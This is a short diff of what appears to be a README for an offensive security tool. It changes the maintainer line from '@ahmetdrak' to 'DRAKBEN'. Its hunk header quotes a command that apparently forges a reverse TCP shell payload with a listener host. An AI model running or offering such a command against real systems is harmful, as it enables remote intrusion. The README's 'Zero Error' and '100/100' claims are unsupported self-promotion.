@@ -107,6 +107,6 @@ python modules/weapon_foundry.py --forge --shell reverse_tcp --lhost 10.0.0.99 -
 
 ---
 
-*Project maintainer: @ahmetdrak*  
+*Project maintainer: *DRAKBEN*  
 *Stability: "Zero Error" Production Ready*
 *Score: 100/100*
